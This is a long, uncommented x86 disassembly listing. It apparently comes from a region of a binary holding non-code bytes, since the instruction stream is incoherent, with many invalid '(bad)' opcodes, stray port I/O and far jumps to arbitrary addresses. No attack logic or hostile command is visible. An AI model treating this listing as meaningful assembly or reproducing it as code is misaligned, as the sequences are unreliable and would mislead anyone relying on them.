  413ee2:	mov    WORD PTR [edi+edx*1-0x1f],cs
  413ee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ee7:	lds    ebx,FWORD PTR ds:0x5d3df4c6
  413eed:	lea    edi,[esi]
  413eef:	idiv   DWORD PTR [edx]
  413ef1:	sar    eax,1
  413ef3:	lock ret 
  413ef5:	xchg   esi,eax
  413ef6:	jo     0x413f5a
  413ef8:	in     eax,0xda
  413efa:	mov    esp,0xd23ca430
  413eff:	and    DWORD PTR [edx+0x3560e21d],eax
  413f05:	daa    
  413f06:	jb     0x413e9c
  413f08:	xor    al,0x4a
  413f0a:	xor    eax,DWORD PTR [esi]
  413f0c:	inc    ebp
  413f0d:	sub    eax,0x8e55f3e
  413f12:	fisub  WORD PTR [ecx-0x556b661b]
  413f18:	lahf   
  413f19:	iret   
  413f1a:	les    edx,FWORD PTR [edi+0x7e]
  413f1d:	jecxz  0x413eeb
  413f1f:	cmp    ax,0x89e6
  413f23:	dec    ebx
  413f24:	ins    DWORD PTR es:[edi],dx
  413f25:	inc    DWORD PTR [edx]
  413f27:	mov    ds:0x7029be4b,al
  413f2c:	adc    cl,BYTE PTR [esi+0x66]
  413f2f:	adc    al,0x7c
  413f31:	mov    eax,0x87d882da
  413f36:	loopne 0x413f63
  413f38:	imul   edi,DWORD PTR [eax+0x154fd52a],0xffffffe3
  413f3f:	not    BYTE PTR [ebx+0x6fc58e2b]
  413f45:	idiv   DWORD PTR [edx+eax*4-0x15]
  413f49:	jg     0x413f47
  413f4b:	pop    esi
  413f4c:	(bad)  
  413f4d:	pop    esp
  413f4e:	xchg   edx,eax
  413f4f:	fmul   QWORD PTR [esi-0x58]
  413f52:	adc    BYTE PTR [esi-0x201b6dca],0x6c
  413f59:	inc    esi
  413f5a:	out    dx,eax
  413f5b:	and    DWORD PTR [ecx],0xe35f2ffe
  413f61:	jbe    0x413fba
  413f63:	sub    edx,ecx
  413f65:	sub    BYTE PTR [edi],dl
  413f67:	or     ah,al
  413f69:	adc    al,0x73
  413f6b:	rcr    ebp,0x36
  413f6e:	mov    BYTE PTR [edi+0x1c],ah
  413f71:	call   0x8231:0x741f7b87
  413f78:	pop    eax
  413f79:	das    
  413f7a:	(bad)  
  413f7b:	retf   
  413f7c:	out    0x56,al
  413f7e:	repnz fidivr DWORD PTR [esi+0x2d]
  413f82:	jg     0x413fbb
  413f84:	mov    ebx,0xbf04edce
  413f89:	popa   
  413f8a:	dec    edx
  413f8b:	arpl   di,cx
  413f8d:	xchg   BYTE PTR [edi-0x1ed48aa5],dl
  413f93:	mov    ebx,0xa11f4c19
  413f98:	push   ds
  413f99:	and    DWORD PTR [edx-0x76],esi
  413f9c:	cld    
  413f9d:	push   0xebd5e34d
  413fa2:	dec    esp
  413fa3:	out    dx,al
  413fa4:	cli    
  413fa5:	inc    eax
  413fa6:	jg     0x414007
  413fa8:	sbb    bh,bl
  413faa:	fld    DWORD PTR [esi+0x2f3b6609]
  413fb0:	test   al,0xf
  413fb2:	cs dec eax
  413fb4:	inc    ecx
  413fb5:	shl    DWORD PTR [edx+0x3d2bb9fa],0xfd
  413fbc:	sub    al,0x6
  413fbe:	xchg   ebp,eax
  413fbf:	popf   
  413fc0:	stos   BYTE PTR es:[edi],al
  413fc1:	retf   
  413fc2:	iret   
  413fc3:	scas   eax,DWORD PTR es:[edi]
  413fc4:	ret    
  413fc5:	xor    DWORD PTR [edi+0x64],edx
  413fc8:	jmp    0x2e1508ef
  413fcd:	rcl    BYTE PTR [edx+0x55],1
  413fd0:	mov    ebp,0xa9d19903
  413fd5:	inc    edx
  413fd6:	mov    ah,0x96
  413fd8:	jecxz  0x413f6f
  413fda:	sub    BYTE PTR [edx+0x7e4a70b3],bl
  413fe0:	es fwait
  413fe2:	and    al,0x62
  413fe4:	adc    BYTE PTR [ecx-0xeb7c326],dl
  413fea:	test   eax,0xe1540c51
  413fef:	jge    0x41406e
  413ff1:	and    dl,BYTE PTR [esp+ebp*8-0x33]
  413ff5:	popf   
  413ff6:	jo     0x413faf
  413ff8:	lods   al,BYTE PTR ds:[esi]
  413ff9:	push   ds
  413ffa:	adc    eax,0x2081e344
  413fff:	enter  0x64d4,0x61
  414003:	fldenv [ecx-0x34578d16]
  414009:	lods   eax,DWORD PTR ds:[esi]
  41400a:	sbb    eax,0x2d0a0090
  41400f:	jbe    0x41408b
  414011:	aas    
  414012:	out    0x78,eax
  414014:	pop    eax
  414015:	sahf   
  414016:	fwait
  414017:	test   BYTE PTR [ecx-0x67724df8],bh
  41401d:	jmp    0x414051
  41401f:	sbb    esp,DWORD PTR [edx-0x65850088]
  414025:	ret    
  414026:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414027:	or     ebx,DWORD PTR [ebx]
  414029:	and    DWORD PTR [edx-0x5d],0xbefeed85
  414030:	ja     0x41403f
  414032:	fisubr WORD PTR [edi+0x6f]
  414035:	jecxz  0x414012
  414037:	call   0x34baaa3c
  41403c:	cmp    eax,0xf43ae870
  414041:	ds jp  0x4140ac
  414044:	pop    ebp
  414045:	sbb    DWORD PTR [edx],esp
  414047:	dec    ebx
  414048:	xchg   BYTE PTR [edi],bl
  41404a:	lea    esi,[eax-0x7dac0a1f]
  414050:	fdiv   st,st(0)
  414052:	mov    ds:0xc06f1889,al
  414057:	inc    edi
  414058:	fisttp QWORD PTR [ebx]
  41405a:	iret   
  41405b:	out    0xc0,al
  41405d:	lods   al,BYTE PTR ds:[esi]
  41405e:	push   ss
  41405f:	xchg   DWORD PTR [ebx-0x567d54ea],edi
  414065:	js     0x414067
  414067:	cmp    al,0x21
  414069:	xchg   ecx,eax
  41406a:	test   DWORD PTR [edx+0x63334b52],0x39a05d58
  414074:	add    dh,dh
  414076:	adc    cl,dh
  414078:	inc    ebx
  414079:	ror    DWORD PTR [ecx-0x3c],cl
  41407c:	nop
  41407d:	mov    ds:0x8489e96b,al
  414082:	repnz shl BYTE PTR [edi],cl
  414085:	or     eax,0x9940a767
  41408b:	stc    
  41408c:	mov    edx,DWORD PTR [ebx+esi*4+0x4f]
  414090:	inc    ebp
  414091:	sub    al,0xbb
  414093:	jb     0x4140f0
  414095:	add    al,0xc
  414097:	arpl   bx,bx
  414099:	sbb    BYTE PTR [ebp+0x5d],al
  41409c:	xchg   esp,eax
  41409d:	sbb    al,0x83
  41409f:	in     al,dx
  4140a0:	push   eax
  4140a1:	adc    eax,0x9a3b2792
  4140a6:	shl    al,1
  4140a8:	mov    esp,0x8b9d402e
  4140ad:	push   ss
  4140ae:	mov    eax,ds:0xcf0afb77
  4140b3:	mov    edi,0x908b3cbe
  4140b8:	push   edx
  4140b9:	stc    
  4140ba:	push   ecx
  4140bb:	repz sub ebx,ecx
  4140be:	aaa    
  4140bf:	sbb    BYTE PTR ss:[ecx-0x2f068d3d],dh
  4140c6:	clc    
  4140c7:	inc    edx
  4140c8:	retf   0x97de
  4140cb:	stc    
  4140cc:	rol    edx,cl
  4140ce:	add    BYTE PTR [ebx+0x2a],al
  4140d1:	mov    cl,0x51
  4140d3:	sbb    BYTE PTR [esi+0x22],ah
  4140d6:	lods   eax,DWORD PTR ds:[esi]
  4140d7:	gs sbb al,0x9
  4140da:	in     eax,0x10
  4140dc:	rol    BYTE PTR [esp+edi*1+0x6a],cl
  4140e0:	mov    ds:0x79c41b59,eax
  4140e5:	push   ebp
  4140e6:	mov    dl,0x7d
  4140e8:	mov    bl,0xec
  4140ea:	mov    ds,WORD PTR [edx+0x49457d7a]
  4140f0:	mov    edi,0xd0b747d8
  4140f5:	xlat   BYTE PTR ds:[ebx]
  4140f6:	xchg   DWORD PTR [edi],eax
  4140f8:	xor    DWORD PTR [ebx-0x71f468f3],ebx
  4140fe:	lock cmp DWORD PTR [edi+esi*2],ebp
  414102:	xor    al,0x79
  414104:	pop    edi
  414105:	jecxz  0x414088
  414107:	push   DWORD PTR [esi]
  414109:	ficomp DWORD PTR [ebx+0x35]
  41410c:	adc    eax,0x1d3ed1b7
  414111:	or     al,0xd5
  414113:	and    ah,BYTE PTR [eax+0x39]
  414116:	addr16 cmp eax,0x70df88be
  41411c:	fild   WORD PTR [edi]
  41411e:	add    bh,BYTE PTR ds:0x14fdf281
  414124:	(bad)  
  414125:	pop    esp
  414126:	xor    esp,esp
  414128:	jge    0x414139
  41412a:	in     eax,0x0
  41412c:	lock mov bh,0xb3
  41412f:	xor    al,BYTE PTR [ebx-0x13]
  414132:	inc    ebp
  414133:	test   eax,0xbf5bfd77
  414138:	add    al,0x96
  41413a:	test   al,0x5c
  41413c:	pop    ebx
  41413d:	jecxz  0x414120
  41413f:	pop    eax
  414140:	mov    ch,0x8a
  414142:	(bad)  
  414143:	xchg   ebx,eax
  414144:	jo     0x41414e
  414146:	jo     0x41416a
  414148:	push   cs
  414149:	pop    ecx
  41414a:	pop    es
  41414b:	aad    0x56
  41414d:	or     DWORD PTR [eax+0x6f],esi
  414150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414151:	push   edi
  414152:	sahf   
  414153:	mov    dh,0xda
  414155:	cmc    
  414156:	in     eax,0x9a
  414158:	cmc    
  414159:	data16 fwait
  41415b:	jg     0x41417f
  41415d:	add    ebp,edi
  41415f:	mov    ecx,0x2970d71f
  414164:	xchg   ebx,eax
  414165:	jb     0x4140f4
  414167:	adc    dh,BYTE PTR [edx]
  414169:	loope  0x414196
  41416b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41416c:	and    esi,esi
  41416e:	clc    
  41416f:	test   al,0x90
  414171:	pop    esi
  414172:	fistp  DWORD PTR [edi+edx*1+0x1d]
  414176:	and    cl,dh
  414178:	icebp  
  414179:	stos   DWORD PTR es:[edi],eax
  41417a:	xchg   esi,eax
  41417b:	cwde   
  41417c:	sub    ch,BYTE PTR [ebx]
  41417e:	mov    ecx,0x66a314df
  414183:	(bad)  
  414184:	call   0x162373c9
  414189:	aaa    
  41418a:	rcl    BYTE PTR [edx-0x5c],1
  41418d:	mov    cl,0x2d
  41418f:	sub    ebx,ebp
  414191:	dec    ebp
  414192:	pop    ebp
  414193:	mov    ch,0x9d
  414195:	jbe    0x414124
  414197:	inc    esi
  414198:	in     al,0xeb
  41419a:	test   DWORD PTR [ecx],0x29f787dd
  4141a0:	ja     0x41419c
  4141a2:	sbb    cl,dh
  4141a4:	add    ah,BYTE PTR [ecx-0x4b22e7a8]
  4141aa:	sub    eax,0x5c0ccf0f
  4141af:	xchg   BYTE PTR [edi+0x33089ab7],ah
  4141b5:	(bad)  
  4141b6:	in     eax,0x62
  4141b8:	nop
  4141b9:	ja     0x41415a
  4141bb:	sub    DWORD PTR [edx],ebx
  4141bd:	inc    ecx
  4141be:	(bad)  
  4141bf:	jae    0x414161
  4141c1:	test   DWORD PTR [ebx],ecx
  4141c3:	pop    edx
  4141c4:	sbb    ah,al
  4141c6:	mov    esp,DWORD PTR [edi-0x20]
  4141c9:	add    edi,DWORD PTR [edx+0x54]
  4141cc:	dec    ebp
  4141cd:	jne    0x4141c0
  4141cf:	mov    ah,BYTE PTR [edi]
  4141d1:	cwde   
  4141d2:	sbb    bh,BYTE PTR [ebx-0x57bd8f64]
  4141d8:	cwde   
  4141d9:	push   eax
  4141da:	xor    BYTE PTR [eax],dh
  4141dc:	mov    cl,0x5f
  4141de:	adc    BYTE PTR [edi],dh
  4141e0:	rcl    DWORD PTR [esi+0x1f],cl
  4141e3:	add    eax,0xedd3bfb
  4141e8:	cmp    DWORD PTR [edx-0x4c],eax
  4141eb:	and    bh,BYTE PTR [esi-0x19]
  4141ee:	scas   eax,DWORD PTR es:[edi]
  4141ef:	lock and ecx,edi
  4141f2:	jle    0x41420a
  4141f4:	dec    ecx
  4141f5:	clc    
  4141f6:	jmp    0x4141ec
  4141f8:	dec    eax
  4141f9:	rol    DWORD PTR [edx-0x59d12463],cl
  4141ff:	jae    0x41426b
  414201:	xchg   BYTE PTR [ebx-0x39bf226e],cl
  414207:	mov    ds:0xce785ff3,al
  41420c:	cmp    DWORD PTR [esi+esi*1],esi
  41420f:	lods   eax,DWORD PTR ds:[si]
  414211:	push   ds
  414212:	icebp  
  414213:	mov    ss,WORD PTR [edx]
  414215:	sbb    DWORD PTR [ecx+0x7903ab71],esp
  41421b:	add    cl,BYTE PTR [eax]
  41421d:	jmp    0xd9e34ee5
  414222:	mov    esp,0x78e20584
  414227:	jae    0x414264
  414229:	pop    ebp
  41422a:	lods   eax,DWORD PTR ds:[esi]
  41422b:	xor    BYTE PTR [ecx+0x2a],dl
  41422e:	sbb    BYTE PTR [ecx],dl
  414230:	xchg   esp,eax
  414231:	cmp    BYTE PTR [eax+0x29aaf7c7],bl
  414237:	ins    DWORD PTR es:[edi],dx
  414238:	test   al,0xc
  41423a:	adc    eax,edi
  41423c:	pop    edx
  41423d:	jp     0x4142a8
  41423f:	shl    esi,0x93
  414242:	inc    ebp
  414243:	and    BYTE PTR [edi+0x3e],al
  414246:	(bad)  [ecx+0x1b]
  414249:	repnz test edi,edx
  41424c:	mov    eax,0x8afde4a7
  414251:	cmc    
  414252:	add    ah,BYTE PTR [edi-0x6591b8d9]
  414258:	sti    
  414259:	jns    0x414270
  41425b:	rol    DWORD PTR [edx],1
  41425d:	ja     0x41424e
  41425f:	sbb    DWORD PTR [edx+0x37],0x53960d5e
  414266:	inc    edi
  414267:	sub    BYTE PTR [eax+0x508b5e30],al
  41426d:	mov    DWORD PTR [esp+ebp*2-0x74338bba],ecx
  414274:	pop    edx
  414275:	push   edx
  414276:	setns  BYTE PTR [esi]
  414279:	bound  eax,QWORD PTR [esi]
  41427b:	mov    edx,0x9facf67c
  414280:	inc    ebx
  414281:	jnp    0x41428e
  414283:	pusha  
  414284:	mov    ebx,DWORD PTR [edi]
  414286:	sbb    bh,BYTE PTR [eax]
  414288:	out    0xad,al
  41428a:	int    0xbb
  41428c:	repnz or cl,BYTE PTR [esi-0x5dd83339]
  414293:	imul   ebp
  414295:	adc    DWORD PTR [ebx+0x4301d3de],edx
  41429b:	jp     0x4142fe
  41429d:	pushf  
  41429e:	daa    
  41429f:	data16 sahf 
  4142a1:	sbb    al,0xb8
  4142a3:	sub    al,0x3
  4142a5:	les    eax,FWORD PTR [ebx+edx*1-0x7d307689]
  4142ac:	ror    DWORD PTR [ebx+0x613f0b9b],0x5b
  4142b3:	add    bl,al
  4142b5:	jo     0x414261
  4142b7:	mov    WORD PTR [edi],?
  4142b9:	hlt    
  4142ba:	call   0xb5d46883
  4142bf:	mov    DWORD PTR [ecx],0x60eb1355
  4142c5:	cmp    ebx,eax
  4142c7:	mov    BYTE PTR [edi],0xc
  4142ca:	stos   BYTE PTR es:[edi],al
  4142cb:	push   ebp
  4142cc:	and    eax,0x2acca66
  4142d1:	sub    ecx,edi
  4142d3:	cli    
  4142d4:	pop    eax
  4142d5:	dec    edi
  4142d6:	shl    bl,cl
  4142d8:	fcomp  DWORD PTR ds:0xf47711c
  4142de:	jmp    0x414282
  4142e0:	and    ecx,ebp
  4142e2:	(bad)  
  4142e6:	add    eax,0xea0f43c5
  4142eb:	sub    bh,BYTE PTR [edi-0x49af9b61]
  4142f1:	and    edi,eax
  4142f3:	xchg   ebp,eax
  4142f4:	lods   eax,DWORD PTR ds:[esi]
  4142f5:	loop   0x414335
  4142f7:	push   ecx
  4142f8:	mov    edx,0x119309de
  4142fd:	call   0xbf47:0xefae5424
  414304:	pop    ss
  414305:	xchg   ebx,eax
  414306:	retf   0xffef
  414309:	in     eax,dx
  41430a:	mov    edi,0xecfc42e3
  41430f:	adc    DWORD PTR [ebx],esi
  414311:	xchg   esi,eax
  414312:	(bad)  
  414313:	xor    al,0x18
  414315:	pushfw 
  414317:	mov    ecx,DWORD PTR [ebp-0x7b]
  41431a:	loopne 0x414309
  41431c:	scas   al,BYTE PTR es:[edi]
  41431d:	js     0x414302
  41431f:	pop    eax
  414320:	loope  0x4142de
  414322:	imul   esi,DWORD PTR [ebx],0x51
  414325:	test   BYTE PTR [ebx+0x181de90],dh
  41432b:	fdiv   QWORD PTR [ebp-0x1a]
  41432e:	adc    edi,DWORD PTR [ebx]
  414330:	popa   
  414331:	std    
  414332:	mov    ds:0x7f61c80f,eax
  414337:	xor    edi,ebp
  414339:	in     eax,dx
  41433a:	popf   
  41433b:	jbe    0x414358
  41433d:	fidiv  WORD PTR [edx+0x0]
  414340:	pop    ds
  414341:	mov    dl,0xfa
  414343:	jne    0x414345
  414345:	xchg   BYTE PTR [ebx-0x69f8ee1b],ch
  41434b:	mov    edi,0xbb5b5244
  414350:	pop    esp
  414351:	lock les eax,FWORD PTR [ecx]
  414354:	pop    es
  414355:	push   ss
  414356:	push   edi
  414357:	or     dl,BYTE PTR [esi+0x3f]
  41435a:	lods   eax,DWORD PTR ds:[esi]
  41435b:	adc    ecx,DWORD PTR [edx]
  41435d:	and    dh,BYTE PTR [ebx+0x724985ae]
  414363:	mov    bl,al
  414365:	add    DWORD PTR [ecx-0x12],esi
  414368:	pop    edi
  414369:	push   ebp
  41436a:	out    0x42,al
  41436c:	mov    edx,0x601071a
  414371:	sbb    al,0xf
  414373:	mov    dh,0x78
  414375:	push   ds
  414376:	iret   
  414377:	gs xchg ebp,eax
  414379:	adc    dl,cl
  41437b:	mov    bl,ah
  41437d:	and    eax,0xde36914
  414382:	loop   0x4143ab
  414384:	in     al,dx
  414385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414386:	dec    edx
  414387:	xchg   edx,eax
  414388:	and    BYTE PTR [ebx+0x4bb5bec1],0x38
  41438f:	and    al,0xa2
  414391:	enter  0x96aa,0xa6
  414395:	(bad)  
  414396:	xor    ebp,DWORD PTR [edx+0x16451b94]
  41439c:	sahf   
  41439d:	clc    
  41439e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41439f:	shl    edi,cl
  4143a1:	lods   al,BYTE PTR ds:[esi]
  4143a2:	loope  0x414405
  4143a4:	push   ds
  4143a5:	std    
  4143a6:	inc    eax
  4143a7:	mov    DWORD PTR [esi],ecx
  4143a9:	enter  0x17fb,0x8b
  4143ad:	rcl    DWORD PTR [edi-0x23a86e1b],cl
  4143b3:	ret    
  4143b4:	dec    edi
  4143b5:	cmp    al,0x9b
  4143b7:	push   esp
  4143b8:	sbb    al,0x73
  4143ba:	jmp    0xaccff3e9
  4143bf:	mov    ecx,0x5b13928d
  4143c4:	popf   
  4143c5:	mov    al,0x24
  4143c7:	jb     0x4143f5
  4143c9:	mov    gs,edi
  4143cb:	stos   DWORD PTR es:[edi],eax
  4143cc:	into   
  4143cd:	bound  ecx,QWORD PTR [esp+eiz*2]
  4143d0:	call   0xbb60:0x15bcfebb
  4143d7:	pushf  
  4143d8:	lds    esi,FWORD PTR [esi]
  4143da:	xchg   DWORD PTR [ebp+ecx*4+0x24580c22],ecx
  4143e1:	retf   0x83df
  4143e4:	stos   DWORD PTR es:[edi],eax
  4143e5:	lods   al,BYTE PTR ds:[esi]
  4143e6:	push   ecx
  4143e7:	vpsrlw ymm4,ymm6,XMMWORD PTR [edx]
  4143eb:	gs xchg ecx,eax
  4143ed:	jno    0x414454
  4143ef:	(bad)  
  4143f0:	and    edi,ebp
  4143f2:	addr16 push ebx
  4143f4:	ins    BYTE PTR es:[edi],dx
  4143f5:	add    DWORD PTR [ebx],0x7cdac80
  4143fb:	dec    esi
  4143fc:	push   eax
  4143fd:	mov    dl,0xd4
  4143ff:	fidiv  WORD PTR [edi]
  414401:	add    al,BYTE PTR [eax+0x29]
  414404:	pop    ebp
  414405:	(bad)  
  414406:	cld    
  414407:	xor    eax,0xc7c3bc8e
  41440c:	sbb    bl,dl
  41440e:	cmp    ah,BYTE PTR [edx-0xe64f84e]
  414414:	pop    edx
  414415:	rol    eax,0x73
  414418:	ret    0x7765
  41441b:	jmp    0x9796:0xdba69d82
  414422:	fcomp  st(4)
  414424:	push   edi
  414425:	push   edx
  414426:	es jb  0x4143dd
  414429:	test   eax,0x8a4b3876
  41442e:	xchg   DWORD PTR [ebp+0x19289cc7],ecx
  414434:	test   al,0x6b
  414436:	or     eax,0xe4167f9b
  41443b:	xor    eax,0x9fcfffb0
  414440:	into   
  414441:	dec    ecx
  414442:	xchg   ebp,eax
  414443:	aas    
  414444:	sbb    DWORD PTR [edx],esi
  414446:	clc    
  414447:	mov    al,0x98
  414449:	mov    ebx,0xa7386417
  41444e:	(bad)  
  41444f:	jmp    0xa021:0x995fd7e9
  414456:	inc    ebx
  414457:	pop    es
  414458:	ins    BYTE PTR es:[edi],dx
  414459:	sbb    edx,0xffffffbd
  41445c:	mov    ch,BYTE PTR [edi+edx*4+0x189bf695]
  414463:	sub    ebx,DWORD PTR [esi+0x1e0d3381]
  414469:	jbe    0x4144cf
  41446b:	mov    edx,0x47b84b4c
  414470:	and    BYTE PTR gs:[ebp+0x5c109f23],0xad
  414478:	dec    edi
  414479:	sbb    BYTE PTR [edx],dl
  41447b:	and    BYTE PTR [ebx],cl
  41447d:	cmp    al,BYTE PTR [edi]
  41447f:	(bad)  
  414480:	pusha  
  414481:	imul   ecx,ebp,0x1c
  414484:	add    dh,BYTE PTR [ebp+0x247fac6e]
  41448a:	mov    bh,0x68
  41448c:	push   es
  41448d:	arpl   WORD PTR [edi],bp
  41448f:	inc    esp
  414490:	pop    ecx
  414491:	pop    esi
  414492:	out    0x81,eax
  414494:	xor    esi,DWORD PTR [ecx-0x10]
  414497:	and    al,BYTE PTR [edi+0x29]
  41449a:	lods   al,BYTE PTR ds:[esi]
  41449b:	xor    al,0x88
  41449d:	mov    edx,ss
  41449f:	daa    
  4144a0:	cld    
  4144a1:	cld    
  4144a2:	dec    esi
  4144a3:	sbb    eax,DWORD PTR [esi]
  4144a5:	dec    eax
  4144a6:	repnz int3 
  4144a8:	ins    DWORD PTR es:[edi],dx
  4144a9:	jmp    0x4144da
  4144ab:	in     eax,0xa
  4144ad:	mov    cl,0xca
  4144af:	push   edx
  4144b0:	jo     0x41443a
  4144b2:	fs pop ebx
  4144b4:	std    
  4144b5:	mov    bl,0x6a
  4144b7:	dec    edi
  4144b8:	push   0x28
  4144ba:	das    
  4144bb:	xchg   edi,eax
  4144bc:	sbb    eax,DWORD PTR [esi+0x167960f6]
  4144c2:	mov    edi,0x476b7d7
  4144c7:	adc    DWORD PTR [eax-0x79b2c150],esi
  4144cd:	jle    0x414518
  4144cf:	ja     0x4144be
  4144d1:	mov    eax,ds:0xbb582869
  4144d6:	(bad)  
  4144d7:	xor    BYTE PTR [esi+0x1d],cl
  4144da:	into   
  4144db:	adc    DWORD PTR [esi-0x1e1af3a0],ebp
  4144e1:	inc    edi
  4144e2:	add    bh,al
  4144e4:	jmp    0x414525
  4144e6:	inc    ecx
  4144e7:	sbb    eax,0x6bb015c6
  4144ec:	pushf  
  4144ed:	dec    eax
  4144ee:	mov    edi,DWORD PTR [ebx+0xc88500d]
  4144f4:	sub    al,0xd6
  4144f6:	in     al,dx
  4144f7:	int    0x4e
  4144f9:	mov    ds:0x590bb4a4,al
  4144fe:	inc    ebp
  4144ff:	jmp    0x41454c
  414501:	push   ds
  414502:	add    al,0x52
  414504:	lea    edx,[edi]
  414506:	pushf  
  414507:	dec    edx
  414508:	iret   
  414509:	inc    ecx
  41450a:	sbb    DWORD PTR [ebp+0x7305ab5b],esi
  414510:	into   
  414511:	add    BYTE PTR [edi+0x7],0x21
  414515:	retf   0x6488
  414518:	jmp    0xe6f7a97e
  41451d:	dec    ebp
  41451e:	push   esp
  41451f:	mov    bl,0xb1
  414521:	fdivr  DWORD PTR [eax-0x7aafa7]
  414527:	mov    dl,0x7b
  414529:	inc    edi
  41452a:	shl    BYTE PTR [ecx-0x18bf98d],0x3e
  414531:	pop    esp
  414532:	inc    eax
  414533:	xchg   ebp,eax
  414534:	inc    eax
  414535:	push   ecx
  414536:	(bad)  
  414537:	popf   
  414538:	(bad)  
  414539:	mov    esi,0x7e72a057
  41453e:	enter  0x1db3,0xc5
  414542:	push   esp
  414543:	dec    edi
  414544:	dec    ebx
  414545:	dec    edi
  414546:	or     BYTE PTR [eax-0x745631a],al
  41454c:	imul   ebp,ebx,0xfffffff4
  41454f:	in     al,0x4d
  414551:	scas   al,BYTE PTR es:[edi]
  414552:	mov    eax,ds:0x541d8fe4
  414557:	cld    
  414558:	fld    st(6)
  41455a:	iret   
  41455b:	jmp    0xd92a:0x3c7d9517
  414562:	adc    ch,0x36
  414565:	in     al,0xf8
  414567:	js     0x41458b
  414569:	dec    edi
  41456a:	dec    eax
  41456b:	xor    ch,dl
  41456d:	mov    cl,0xc5
  41456f:	inc    ebx
  414570:	pop    ebp
  414571:	imul   eax,DWORD PTR [esi+0x45a8c7b3],0x75
  414578:	hlt    
  414579:	out    dx,al
  41457a:	popf   
  41457b:	adc    BYTE PTR [esi],cl
  41457d:	stos   DWORD PTR es:[edi],eax
  41457e:	xor    al,0x69
  414580:	xor    DWORD PTR ds:0x74c748dd,edx
  414586:	cmc    
  414587:	ret    
  414588:	(bad)  
  414589:	jp     0x4145df
  41458b:	mov    ah,BYTE PTR es:[ecx]
  41458e:	xor    edi,edx
  414590:	enter  0x5fac,0xf0
  414594:	lea    edi,ds:0xaf4344e6
  41459a:	scas   al,BYTE PTR es:[edi]
  41459b:	retf   
  41459c:	and    eax,0xf68dd829
  4145a1:	mov    cx,0xac19
  4145a5:	aad    0x72
  4145a7:	xchg   esi,eax
  4145a8:	scas   eax,DWORD PTR es:[edi]
  4145a9:	mov    DWORD PTR [ecx+0x18],eax
  4145ac:	inc    edx
  4145ad:	stos   BYTE PTR es:[edi],al
  4145ae:	xchg   esi,eax
  4145af:	pop    ds
  4145b0:	sbb    ch,bl
  4145b2:	shr    DWORD PTR [eax+0x181116d9],1
  4145b8:	retf   0x57c8
  4145bb:	xchg   ecx,eax
  4145bc:	xchg   DWORD PTR [eax+eax*1],edi
  4145bf:	into   
  4145c0:	ret    0x21de
  4145c3:	xor    bl,BYTE PTR [edx-0x18]
  4145c6:	jl     0x414623
  4145c8:	mov    BYTE PTR [edx-0x2c],dl
  4145cb:	je     0x414635
  4145cd:	das    
  4145ce:	pop    ebp
  4145cf:	and    al,0x6a
  4145d1:	les    edx,FWORD PTR [ecx+ebx*8-0x1a]
  4145d5:	sub    al,0xd2
  4145d7:	retf   
  4145d8:	adc    ebp,ebx
  4145da:	es xor eax,0xe839118a
  4145e0:	icebp  
  4145e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145e2:	xchg   edi,eax
  4145e3:	and    al,0x2b
  4145e5:	int3   
  4145e6:	cmc    
  4145e7:	sub    ebp,DWORD PTR cs:0x1fb99a95
  4145ee:	pop    ss
  4145ef:	inc    edx
  4145f0:	stos   BYTE PTR es:[edi],al
  4145f1:	dec    eax
  4145f2:	mov    cl,0x5f
  4145f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145f5:	imul   edx,DWORD PTR [ecx-0x7352400b],0xe58b5818
  4145ff:	mov    al,0x98
  414601:	xchg   ebx,eax
  414602:	jb     0x414629
  414604:	mov    cl,0x37
  414606:	add    eax,0x345bc6c1
  41460b:	cld    
  41460c:	in     al,dx
  41460d:	xor    al,0x86
  41460f:	mov    ebx,0x8a98385
  414614:	psrlq  mm6,mm2
  414617:	daa    
  414618:	fld    QWORD PTR [esi+0x74]
  41461b:	rol    ah,1
  41461d:	ins    DWORD PTR es:[edi],dx
  41461e:	sub    esi,edi
  414620:	add    ecx,DWORD PTR [ebp-0x68c6de22]
  414626:	mov    bh,0xb6
  414628:	outs   dx,DWORD PTR ds:[esi]
  414629:	repz pop ebx
  41462b:	push   ss
  41462c:	clc    
  41462d:	pop    ebp
  41462e:	inc    ebp
  41462f:	call   0x546f:0xcf26abe2
  414636:	pop    esp
  414637:	xchg   ebp,eax
  414638:	pop    ebx
  414639:	mov    edi,0x8b2e03ec
  41463e:	dec    esi
  41463f:	add    esp,DWORD PTR [edx*1-0x6a62efbd]
  414646:	xor    bh,0x7c
  414649:	cmp    al,0x1e
  41464b:	xchg   esp,eax
  41464c:	sub    BYTE PTR [esi-0x22],dh
  41464f:	scas   eax,DWORD PTR es:[edi]
  414650:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414651:	rcr    al,cl
  414653:	imul   esi,DWORD PTR [eax+0x61],0xffffffe4
  414657:	rcr    BYTE PTR [edx+0x33],cl
  41465a:	out    0x4a,al
  41465c:	sub    DWORD PTR [eax-0x60103ada],ecx
  414662:	or     ebx,DWORD PTR [eax]
  414664:	cld    
  414665:	cs pop eax
  414667:	fidiv  DWORD PTR [edx+edx*8+0x29]
  41466b:	leave  
  41466c:	push   esp
  41466d:	jmp    0x414635
  41466f:	dec    esp
  414670:	test   BYTE PTR [ebp+0x20],cl
  414673:	mov    cl,0xff
  414675:	sbb    DWORD PTR [ecx],edi
  414677:	mov    edi,0x60265d16
  41467c:	push   ebp
  41467d:	aam    0xfb
  41467f:	xor    al,0x8d
  414681:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414682:	mov    dh,0x32
  414684:	int    0x85
  414686:	mov    cl,0xa6
  414688:	push   ds
  414689:	(bad)
  41468c:	fld    TBYTE PTR [ebx-0x3fceff84]
  414692:	in     eax,0x6e
  414694:	xor    BYTE PTR [ebx],0x48
  414697:	bound  eax,QWORD PTR [ebx]
  414699:	repnz hlt 
  41469b:	cli    
  41469c:	mov    ah,0x5c
  41469e:	push   edi
  41469f:	mov    ecx,0x4631e262
  4146a4:	outs   dx,DWORD PTR ds:[esi]
  4146a5:	cwde   
  4146a6:	dec    ebp
  4146a7:	dec    ebx
  4146a8:	lods   eax,DWORD PTR ds:[esi]
  4146a9:	inc    ecx
  4146aa:	mov    cl,0x91
